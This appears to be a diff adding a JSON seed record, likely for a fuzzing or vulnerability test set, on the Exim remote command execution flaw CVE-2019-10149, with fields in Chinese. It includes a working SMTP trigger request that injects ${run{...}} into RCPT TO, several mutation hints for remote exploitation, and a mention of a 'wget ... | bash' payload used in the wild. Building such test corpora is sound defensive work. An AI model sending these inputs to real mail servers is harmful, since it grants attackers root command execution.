@@ -1,0 +1,55 @@
+{
+  "avd_id": "CVE-2019-10149",
+  "scope": "seedgen",
+  "confidence": "high",
+  "title_avd": "Exim deliver_message() 远程命令执行（Return of the WIZard）",
+  "description_raw": "Exim 4.87~4.91 的 deliver_message() 函数（src/deliver.c）对收件人地址校验不当，MAIL FROM / RCPT TO 地址中的 ${run{...}} 字符串扩展会被以 root 权限执行，导致无需内存破坏即可远程命令执行（execv()）。NSA 通报 Sandworm 自 2019 年起在野利用。",
+  "risk_level_avd": "严重",
+  "cwe_avd": "CWE-78 (OS命令注入)",
+  "trigger": {
+    "method": {
+      "value": [
+        "MAIL FROM",
+        "RCPT TO"
+      ],
+      "confidence": "confirmed"
+    },
+    "field": {
+      "value": "MAIL FROM / RCPT TO 地址（local part / domain）",
+      "confidence": "confirmed"
+    },
+    "condition": {
+      "value": "地址包含 ${run{/bin/sh -c 'cmd'}} 等字符串扩展；本地攻击直接利用，远程需 verify=recipient ACL 关闭或 local_part_suffix 配置",
+      "confidence": "confirmed"
+    }
+  },
+  "trigger_requests": {
+    "value": [
+      "EHLO x\r\nMAIL FROM:<a@b>\r\nRCPT TO:<balrog+${run{/usr/bin/id}}@localhost>\r\nDATA\r\n.\r\nQUIT\r\n"
+    ],
+    "confidence": "confirmed"
+  },
+  "mutation_hints": {
+    "value": [
+      "在 MAIL FROM/RCPT TO 地址中注入 ${run{...}} / ${expand{...}} 扩展",
+      "使用 local_part_suffix=+ 配置 + 特殊 tag",
+      "中继域 relay_to_domains 下的远程利用"
+    ],
+    "confidence": "confirmed"
+  },
+  "provenance": {
+    "description_raw": "confirmed",
+    "title_avd": "confirmed",
+    "risk_level_avd": "confirmed",
+    "cwe_avd": "confirmed",
+    "trigger_method": "confirmed",
+    "trigger_field": "confirmed",
+    "trigger_condition": "confirmed",
+    "trigger_requests": "confirmed",
+    "trigger_requests_note": "Sandworm 在 MAIL FROM 字段注入 /bin/sh -c 'wget ... | bash' 载荷",
+    "mutation_hints": "confirmed"
+  },
+  "unmatched_avd": false,
+  "avd_id_equivalent": null,
+  "case_id": "SMTP-001"
+}
